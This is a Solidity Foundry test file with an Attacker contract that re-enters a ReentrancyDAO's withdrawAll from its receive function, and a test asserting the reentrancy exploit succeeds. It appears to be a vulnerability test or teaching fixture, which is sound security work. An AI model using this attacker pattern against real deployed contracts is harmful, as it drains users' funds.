
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdstorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    using stdstorage for StdStorage;
    
    ReentrancyDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);
        vm.assume(attackVal * 3 < type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 3);
        vm.deal(address(this), attackVal * 3);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    
    constructor(address victimAddress) { 
        _victim = ReentrancyDAO(victimAddress);
    }
    
    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.deposit{value: val}();
    }
    
    function attack(uint256 val) public {
        initialSnapshot = address(_victim).balance;
        
        _victim.withdrawAll();
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }
    
    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.withdrawAll();
            attackCallCount++;
        }
    }
}
